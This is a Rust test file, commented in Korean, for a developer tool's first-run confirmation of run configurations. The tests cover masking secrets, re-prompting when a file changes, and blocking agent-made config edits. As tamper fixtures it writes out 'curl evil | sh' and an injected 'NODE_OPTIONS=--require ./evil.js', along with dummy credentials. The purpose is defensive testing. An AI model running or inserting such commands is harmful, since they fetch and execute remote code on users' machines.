//! 첫 실행 확인(17-m6-plan M6-07 ⑥ — `super::super::confirm` 머리 주석). 확인 없이 다시 부르지 않는 `call_once` 로 본다.

use super::*;
use crate::runs::confirm::{RunConfirmRequired, code::CONFIRM_REQUIRED};

/// `run.start` 한 번(자동 확인 없이).
async fn start_once(
    c: &mut Client,
    f: &Fixture,
    confirmed: Option<&str>,
) -> Result<RunInfo, RpcError> {
    let mut params = json!({"projectId": f.project, "configId": "dev"});
    if let Some(hash) = confirmed {
        params["confirmed"] = json!(hash);
    }
    c.call_once("run.start", params)
        .await
        .outcome
        .map(|v| serde_json::from_value(v).unwrap())
}

fn asked(e: RpcError) -> RunConfirmRequired {
    assert_eq!(e.code, CONFIRM_REQUIRED, "{e:?}");
    serde_json::from_value(e.data.unwrap()).unwrap()
}

/// 사람이 본 적 없는 구성은 띄우지 않고 내용을 보인다 — argv 와 정의 본문은 그대로, env 의 값만 가리고, 비밀처럼 보이는 명령에는
/// 표지. 확인하면 띄우고 기록되며, 그 뒤로는 묻지 않는다.
#[tokio::test(flavor = "multi_thread")]
async fn an_unseen_config_is_shown_before_it_runs_and_recorded_after() {
    let f = Fixture::fake(RunLimits::default());
    fs::write(f.root.join(".env.local"), "PORT=3000\nAPI_TOKEN=tok-zz9\n").unwrap();
    fs::create_dir_all(f.root.join("app")).unwrap();
    f.config(
        &f.root,
        "dev",
        "name = \"Dev\"\ntype = \"shell\"\ncwd = \"app\"\ncommand = \"psql postgres://u:pw@db/x\"\nenv_file = [\".env.local\"]\n[env]\nDATABASE_URL = \"postgres://me:s3cr3t-q@h/db\"\nMODE = \"dev\"",
    );
    let mut c = f.client();
    let ask = asked(start_once(&mut c, &f, None).await.unwrap_err());
    assert_eq!(
        f.fake_launcher().calls(),
        0,
        "nothing runs before the person confirms"
    );
    assert_eq!(f.projects.run_seen(&f.project, "dev").unwrap(), None);
    let shown = &ask.shown;
    assert_eq!(
        (shown.key.as_str(), shown.name.as_str(), shown.kind.as_str()),
        ("dev", "Dev", "shell")
    );
    assert_eq!(shown.cwd, "app");
    assert_eq!(
        shown.argv.last().map(String::as_str),
        Some("psql postgres://u:pw@db/x"),
        "the command is shown as written"
    );
    assert!(
        shown.secret_looking,
        "a URL with a password in the command is flagged"
    );
    let env: BTreeMap<_, _> = shown
        .env
        .iter()
        .map(|v| (v.name.as_str(), (v.value.as_str(), v.masked)))
        .collect();
    assert_eq!(env["PORT"], ("3000", false));
    assert_eq!(env["MODE"], ("dev", false));
    assert!(
        env["API_TOKEN"].1 && !env["API_TOKEN"].0.contains("tok-zz9"),
        "{env:?}"
    );
    assert!(
        env["DATABASE_URL"].1 && !env["DATABASE_URL"].0.contains("s3cr3t-q"),
        "{env:?}"
    );
    assert!(
        env["DATABASE_URL"].0.starts_with("postgres://me:"),
        "{env:?}"
    );
    assert_eq!(shown.env_files.len(), 1);
    assert_eq!(shown.env_files[0].path, ".env.local");
    assert!(shown.recordable);
    let text = serde_json::to_string(&ask).unwrap();
    assert!(
        !text.contains("tok-zz9") && !text.contains("s3cr3t-q"),
        "{text}"
    );

    let run = start_once(&mut c, &f, Some(&ask.hash)).await.unwrap();
    assert_eq!(f.fake_launcher().calls(), 1);
    let seen = f
        .projects
        .run_seen(&f.project, "dev")
        .unwrap()
        .expect("recorded");
    assert_eq!(seen.hash.as_str(), ask.hash);
    assert_eq!(seen.place, pw_core::registry::run_seen::SeenPlace::Run);
    assert_eq!(run.config, "dev");

    start_once(&mut c, &f, None)
        .await
        .expect("a seen config runs without asking");
    assert_eq!(f.fake_launcher().calls(), 2);
}

/// 확인과 띄우기 사이에 파일이 바뀌면 그 확인으로는 띄우지 않고 새 내용으로 다시 묻는다 — 해시는 띄울 그 값에서 낸다(확인한
/// 열쇠만 보고 띄우면 실패).
#[tokio::test(flavor = "multi_thread")]
async fn a_file_changed_after_the_confirmation_is_asked_again() {
    let f = Fixture::fake(RunLimits::default());
    f.shell_config("dev", "echo one");
    let mut c = f.client();
    let first = asked(start_once(&mut c, &f, None).await.unwrap_err());
    f.shell_config("dev", "echo two");
    let again = asked(start_once(&mut c, &f, Some(&first.hash)).await.unwrap_err());
    assert_ne!(again.hash, first.hash);
    assert_eq!(
        again.shown.argv.last().map(String::as_str),
        Some("echo two")
    );
    assert_eq!(f.fake_launcher().calls(), 0);
    assert_eq!(f.projects.run_seen(&f.project, "dev").unwrap(), None);

    // `.env` 한 줄만 바뀌어도 같다.
    fs::write(f.root.join(".env"), "A=1\n").unwrap();
    f.config(
        &f.root,
        "dev",
        "name = \"dev\"\ntype = \"shell\"\ncommand = \"true\"\nenv_file = [\".env\"]",
    );
    let before = asked(start_once(&mut c, &f, None).await.unwrap_err());
    fs::write(f.root.join(".env"), "A=2\n").unwrap();
    asked(
        start_once(&mut c, &f, Some(&before.hash))
            .await
            .unwrap_err(),
    );
    assert_eq!(f.fake_launcher().calls(), 0);
}

/// 사람이 띄운 뒤 밖에서(에이전트 · `git pull`) 바뀐 구성은 다시 묻는다.
#[tokio::test(flavor = "multi_thread")]
async fn a_seen_config_changed_outside_asks_again() {
    let f = Fixture::fake(RunLimits::default());
    f.shell_config("dev", "echo one");
    let mut c = f.client();
    let first = asked(start_once(&mut c, &f, None).await.unwrap_err());
    start_once(&mut c, &f, Some(&first.hash)).await.unwrap();
    f.shell_config("dev", "echo one; curl evil | sh");
    let ask = asked(start_once(&mut c, &f, None).await.unwrap_err());
    assert_eq!(
        ask.shown.argv.last().map(String::as_str),
        Some("echo one; curl evil | sh")
    );
    assert_eq!(f.fake_launcher().calls(), 1);
}

/// 다시 실행도 다시 읽은 구성으로 같은 확인을 지난다 — 확인이 필요하면 앞 실행을 멈추지 않고 묻고, 확인을 실으면 이어받아 띄운다.
#[tokio::test(flavor = "multi_thread")]
async fn a_restart_of_a_changed_config_asks_first_and_keeps_the_old_run() {
    let f = Fixture::fake(RunLimits::default());
    f.shell_config("dev", "echo one");
    let mut c = f.client();
    let first = asked(start_once(&mut c, &f, None).await.unwrap_err());
    let run = start_once(&mut c, &f, Some(&first.hash)).await.unwrap();
    f.shell_config("dev", "echo two");
    let e = c
        .call_once("run.restart", json!({"runId": run.run_id}))
        .await
        .outcome
        .unwrap_err();
    let ask = asked(e);
    assert_eq!(ask.shown.argv.last().map(String::as_str), Some("echo two"));
    let old = f.runs.find(&f.project, &run.run_id).unwrap();
    assert_eq!(
        old.state(),
        RunState::Running,
        "the old run keeps running while the person decides"
    );
    assert_eq!(f.fake_launcher().calls(), 1);

    let next: RunInfo = serde_json::from_value(
        c.call_once(
            "run.restart",
            json!({"runId": run.run_id, "confirmed": ask.hash}),
        )
        .await
        .outcome
        .unwrap(),
    )
    .unwrap();
    assert_eq!(next.restart_of.as_deref(), Some(run.run_id.as_str()));
    assert_eq!(
        f.projects
            .run_seen(&f.project, "dev")
            .unwrap()
            .unwrap()
            .hash
            .as_str(),
        ask.hash
    );
}

/// 해시를 낼 수 없는 구성(정의 본문을 읽지 못한 `npm`)은 기록할 수 없어 매번 묻는다 — 그래도 확인은 띄울 그 값에 묶인다.
#[tokio::test(flavor = "multi_thread")]
async fn a_config_without_a_seen_hash_asks_every_time() {
    let f = Fixture::fake(RunLimits::default());
    f.config(
        &f.root,
        "dev",
        "name = \"dev\"\ntype = \"npm\"\nscript = \"dev\"",
    );
    let mut c = f.client();
    let ask = asked(start_once(&mut c, &f, None).await.unwrap_err());
    assert!(!ask.shown.recordable);
    assert!(ask.hash.starts_with("once:"), "{}", ask.hash);
    start_once(&mut c, &f, Some(&ask.hash)).await.unwrap();
    assert_eq!(f.projects.run_seen(&f.project, "dev").unwrap(), None);
    let again = asked(start_once(&mut c, &f, None).await.unwrap_err());
    assert_eq!(again.hash, ask.hash);
    assert_eq!(f.fake_launcher().calls(), 1);
}

/// 에이전트의 길(승인 계획의 허가)은 이 확인을 지나지 않는다 — 그 길은 승인이 묻는다.
#[tokio::test(flavor = "multi_thread")]
async fn the_agent_branch_does_not_ask_the_window_question() {
    let f = Fixture::fake(RunLimits::default());
    let marker = f.tmp.path().join("ran");
    let grant = f.agent_grant(&f.project, touching_spec(&f.root, &marker));
    f.runs.start_agent(&grant, 0, agent(), None).unwrap();
    assert_eq!(f.fake_launcher().calls(), 1);
}

// ---- 구성 편집 화면(M6-07 ④ ⑤) ----------------------------------------------------------------------------------------

/// 이 Fixture 의 레지스트리 · 경로에 붙은 구성 RPC.
fn configs(f: &Fixture) -> Arc<crate::config::methods::RunConfigs> {
    let configs = Arc::new(crate::config::methods::RunConfigs::new());
    configs.attach(crate::config::methods::HostParts {
        paths: AppPaths::under(&f.tmp.path().join("app")),
        projects: f.projects.clone(),
    });
    configs.attach_runs(f.runs.clone());
    configs
}

/// 구성 RPC 를 실행 RPC 와 같은 세션에 붙인 클라이언트(그 프로젝트 창, 또는 `scope`).
fn screen(f: &Fixture, scope: ConnectionScope) -> Client {
    let mut router = Router::new();
    methods::register(&mut router, f.runs.clone());
    crate::config::methods::register(&mut router, configs(f));
    let (session, rx) = Session::new(
        Arc::new(router),
        EventHub::new(),
        Caller {
            role: Role::Owner,
            scope,
            window: Some("project-window".into()),
        },
    );
    Client {
        session,
        rx,
        next_id: 1,
        responses: Vec::new(),
        events: Vec::new(),
        ended: Vec::new(),
    }
}

fn save_params(f: &Fixture, command: &str) -> Value {
    json!({
        "projectId": f.project,
        "id": "dev",
        "config": {
            "name": "dev", "type": "shell", "command": command, "envFile": [".env"],
            "profiles": {"fast": {"env": {"MODE": "fast"}}},
        },
    })
}

/// 화면에서 저장한 구성은 — 편집 화면이 보인 구성 파일이 해시의 전부이면 — 「사람이 본 구성」(`SeenPlace::Save`)이 되고, 프로필 없이
/// 띄우면 묻지 않는다(저장의 해시가 창의 실행과 같은 풀기다). 밖에서 구성을 고치면 다시 묻는다.
#[tokio::test(flavor = "multi_thread")]
async fn a_config_saved_on_screen_runs_without_asking() {
    let f = Fixture::fake(RunLimits::default());
    let mut c = screen(&f, ConnectionScope::Project(f.project.clone()));
    let mut params = save_params(&f, "echo hi");
    params["config"]["envFile"] = json!([]);
    c.call_once("run.config.save", params)
        .await
        .outcome
        .unwrap();
    let seen = f
        .projects
        .run_seen(&f.project, "dev")
        .unwrap()
        .expect("recorded on save");
    assert_eq!(seen.place, pw_core::registry::run_seen::SeenPlace::Save);
    start_once(&mut c, &f, None)
        .await
        .expect("a saved config runs without asking");
    assert_eq!(f.fake_launcher().calls(), 1);

    f.shell_config("dev", "echo hi; curl evil | sh");
    asked(start_once(&mut c, &f, None).await.unwrap_err());
    assert_eq!(f.fake_launcher().calls(), 1);
}

/// 리뷰 F2 재현: 에이전트가 `.env.local` 을 바꾼 뒤 사람이 그 구성을 화면에서 저장해도(이름만 고침) 바뀐 `.env` 는 편집 화면에
/// 보이지 않았다 — 저장은 기록하지 않고, 첫 실행이 그 값을 보이고 묻는다. 정의 본문(npm script)이 드는 구성도 같다.
#[tokio::test(flavor = "multi_thread")]
async fn saving_does_not_record_content_the_editor_did_not_show() {
    let f = Fixture::fake(RunLimits::default());
    fs::write(f.root.join(".env"), "PORT=1\n").unwrap();
    let mut c = screen(&f, ConnectionScope::Project(f.project.clone()));
    c.call_once("run.config.save", save_params(&f, "echo hi"))
        .await
        .outcome
        .unwrap();
    // 에이전트가 파일 도구로 `.env` 를 바꾼다 — 그리고 사람이 구성의 이름만 고쳐 저장한다.
    fs::write(
        f.root.join(".env"),
        "PORT=1\nNODE_OPTIONS=--require ./evil.js\n",
    )
    .unwrap();
    let mut renamed = save_params(&f, "echo hi");
    renamed["config"]["name"] = json!("dev server");
    c.call_once("run.config.save", renamed)
        .await
        .outcome
        .unwrap();
    assert_eq!(f.projects.run_seen(&f.project, "dev").unwrap(), None);
    let ask = asked(start_once(&mut c, &f, None).await.unwrap_err());
    assert!(
        ask.shown
            .env
            .iter()
            .any(|v| v.name == "NODE_OPTIONS" && v.value == "--require ./evil.js"),
        "{:?}",
        ask.shown.env
    );
    assert_eq!(f.fake_launcher().calls(), 0);

    // 정의 본문이 드는 구성(npm)도 저장으로 기록하지 않는다.
    fs::write(f.root.join("package.json"), r#"{"scripts":{"dev":"vite"}}"#).unwrap();
    fs::write(f.root.join("pnpm-lock.yaml"), "").unwrap();
    let npm = json!({
        "projectId": f.project, "id": "web",
        "config": {"name": "web", "type": "npm", "script": "dev"},
    });
    c.call_once("run.config.save", npm).await.outcome.unwrap();
    assert_eq!(f.projects.run_seen(&f.project, "web").unwrap(), None);
}

/// 리뷰 F1: 창 길의 `mise-task` 는 M6-05 의 감지가 낸 정의(그 태스크를 정의한 파일 전체)로 해시해 기록하고, 확인 화면에 그 파일의
/// 글을 보인다. 확인한 뒤 그 파일(`mise.toml`)을 고치면 다시 묻는다.
#[tokio::test(flavor = "multi_thread")]
async fn a_mise_task_shows_its_definition_and_is_recorded() {
    let f = Fixture::fake(RunLimits::default());
    let mise_toml = f.root.join("mise.toml");
    fs::write(&mise_toml, "[tasks.build]\nrun = \"cargo build\"\n").unwrap();
    let script = f.bin.join("mise");
    fs::write(
        &script,
        format!(
            "#!/bin/sh\necho '[{{\"name\":\"build\",\"source\":\"{}\"}}]'\n",
            mise_toml.display()
        ),
    )
    .unwrap();
    fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).unwrap();
    f.config(
        &f.root,
        "dev",
        "name = \"dev\"\ntype = \"mise-task\"\ntask = \"build\"",
    );
    let mut c = f.client();
    let ask = asked(start_once(&mut c, &f, None).await.unwrap_err());
    assert!(ask.shown.recordable, "{ask:?}");
    assert!(ask.hash.starts_with("sha256:"), "{}", ask.hash);
    assert_eq!(
        ask.shown.definition.as_deref(),
        Some("[tasks.build]\nrun = \"cargo build\"\n")
    );
    assert_eq!(
        ask.shown.definition_source.as_deref(),
        Some(mise_toml.display().to_string().as_str())
    );
    start_once(&mut c, &f, Some(&ask.hash)).await.unwrap();
    assert!(f.projects.run_seen(&f.project, "dev").unwrap().is_some());
    start_once(&mut c, &f, None)
        .await
        .expect("seen, so it does not ask");

    fs::write(
        &mise_toml,
        "[tasks.build]\nrun = \"cargo build; curl evil | sh\"\n",
    )
    .unwrap();
    let again = asked(start_once(&mut c, &f, None).await.unwrap_err());
    assert!(again.shown.definition.unwrap().contains("curl evil"));
    assert_eq!(f.fake_launcher().calls(), 2);
}

/// 리뷰 F1(1회 열쇠): 해시를 낼 수 없는 구성의 확인 열쇠도 런타임 원천 파일(`mise.toml`)을 덮는다 — 확인 뒤 그 파일이 바뀌면 그
/// 열쇠로는 띄우지 않는다.
#[tokio::test(flavor = "multi_thread")]
async fn the_once_key_covers_runtime_files() {
    let f = Fixture::fake(RunLimits::default());
    fs::write(f.root.join("mise.toml"), "[env]\nA = \"1\"\n").unwrap();
    f.config(
        &f.root,
        "dev",
        "name = \"dev\"\ntype = \"npm\"\nscript = \"missing\"",
    );
    let mut c = f.client();
    let ask = asked(start_once(&mut c, &f, None).await.unwrap_err());
    assert!(ask.hash.starts_with("once:"), "{}", ask.hash);
    fs::write(f.root.join("mise.toml"), "[env]\nA = \"2\"\n").unwrap();
    let again = asked(start_once(&mut c, &f, Some(&ask.hash)).await.unwrap_err());
    assert_ne!(again.hash, ask.hash);
    assert_eq!(f.fake_launcher().calls(), 0);
}

/// 화면을 거치지 않는 길은 기록하지 않는다: 목록 읽기(파일 감시 뒤 다시 읽기도 이 길이다), 에이전트 · 다른 연결의 저장(거절),
/// 밖에서 쓴 파일. 그런 구성은 처음 띄울 때 묻는다.
#[tokio::test(flavor = "multi_thread")]
async fn only_screen_actions_record_what_a_person_saw() {
    let f = Fixture::fake(RunLimits::default());
    f.shell_config("dev", "echo from outside");
    let mut own = screen(&f, ConnectionScope::Project(f.project.clone()));
    for _ in 0..2 {
        own.call_once("run.config.list", json!({"projectId": f.project}))
            .await
            .outcome
            .unwrap();
    }
    for scope in [ConnectionScope::Agent, ConnectionScope::Host] {
        let mut other = screen(&f, scope);
        other
            .call_once("run.config.save", save_params(&f, "echo agent"))
            .await
            .outcome
            .unwrap_err();
    }
    assert_eq!(f.projects.run_seen(&f.project, "dev").unwrap(), None);
    asked(start_once(&mut own, &f, None).await.unwrap_err());
}

fn git(dir: &Path, args: &[&str]) {
    let status = std::process::Command::new("git")
        .args(args)
        .current_dir(dir)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .status()
        .unwrap();
    assert!(status.success(), "git {args:?}");
}

/// git 이 추적하는 `run/*.local.toml`(m6-localpolicy 리뷰 R2): 편집 화면에는 개인이 아니라 공유로 보이고, 지우기(개인만 · 둘 다)는
/// 아무것도 지우지 않고 거절한다. 추적되지 않는 개인 파일은 그대로 개인이고 지워진다.
#[tokio::test(flavor = "multi_thread")]
async fn a_tracked_local_file_reads_as_shared_and_is_not_deleted() {
    let f = Fixture::fake(RunLimits::default());
    git(&f.root, &["init", "-q"]);
    f.shell_config("dev", "echo shared");
    let local = f.root.join(".pitwall/run/dev.local.toml");
    fs::write(&local, "command = \"echo local\"\n").unwrap();
    git(&f.root, &["add", "-f", ".pitwall/run/dev.local.toml"]);
    let mut c = screen(&f, ConnectionScope::Project(f.project.clone()));
    let list = c
        .call_once("run.config.list", json!({"projectId": f.project}))
        .await
        .outcome
        .unwrap();
    let origins: Vec<_> = list["configs"][0]["layers"]
        .as_array()
        .unwrap()
        .iter()
        .map(|l| l["origin"].as_str().unwrap().to_owned())
        .collect();
    assert_eq!(origins, ["shared", "shared"], "{list}");
    for location in [json!("local"), Value::Null] {
        let e = c
            .call_once(
                "run.config.delete",
                json!({"projectId": f.project, "id": "dev", "location": location}),
            )
            .await
            .outcome
            .unwrap_err();
        assert_eq!(e.code, pw_rpc::code::CONFLICT, "{e:?}");
        assert_eq!(e.data.unwrap()["reason"], "trackedLocalFile");
        assert!(local.exists());
        assert!(
            f.root.join(".pitwall/run/dev.toml").exists(),
            "nothing is deleted"
        );
    }

    // 추적을 풀고 git 이 모르는 내용으로 바꾸면 개인 파일이다(인덱스에 올렸던 그 내용 그대로면 「받아 온 내용」 으로 공유다).
    git(
        &f.root,
        &["rm", "-q", "--cached", ".pitwall/run/dev.local.toml"],
    );
    fs::write(&local, "command = \"echo mine\"\n").unwrap();
    let list = c
        .call_once("run.config.list", json!({"projectId": f.project}))
        .await
        .outcome
        .unwrap();
    assert_eq!(list["configs"][0]["layers"][1]["origin"], "local", "{list}");
    c.call_once(
        "run.config.delete",
        json!({"projectId": f.project, "id": "dev", "location": "local"}),
    )
    .await
    .outcome
    .unwrap();
    assert!(!local.exists());
}

/// 「TOML 보기」(`run.config.preview`)는 저장하면 생길 글 그대로이고 쓰지 않는다 — 주석 · 모르는 키도 저장과 같이 지킨다. 다른
/// 연결은 읽지 못한다.
#[tokio::test(flavor = "multi_thread")]
async fn the_toml_view_is_what_saving_writes() {
    let f = Fixture::fake(RunLimits::default());
    let file = f.root.join(".pitwall/run/dev.toml");
    f.config(
        &f.root,
        "dev",
        "# keep me\nname = \"dev\"\ntype = \"shell\"\ncommand = \"a\"\nfuture = 1",
    );
    let before = fs::read_to_string(&file).unwrap();
    let mut c = screen(&f, ConnectionScope::Project(f.project.clone()));
    let preview = c
        .call_once("run.config.preview", save_params(&f, "echo b"))
        .await
        .outcome
        .unwrap();
    assert_eq!(
        fs::read_to_string(&file).unwrap(),
        before,
        "preview does not write"
    );
    assert_eq!(preview["before"], json!(before));
    let text = preview["text"].as_str().unwrap().to_owned();
    assert!(
        text.contains("# keep me") && text.contains("future = 1"),
        "{text}"
    );
    c.call_once("run.config.save", save_params(&f, "echo b"))
        .await
        .outcome
        .unwrap();
    assert_eq!(fs::read_to_string(&file).unwrap(), text);

    let mut agent = screen(&f, ConnectionScope::Agent);
    let e = agent
        .call_once("run.config.preview", save_params(&f, "echo c"))
        .await
        .outcome
        .unwrap_err();
    assert_eq!(e.code, pw_rpc::code::PERMISSION_DENIED);
}
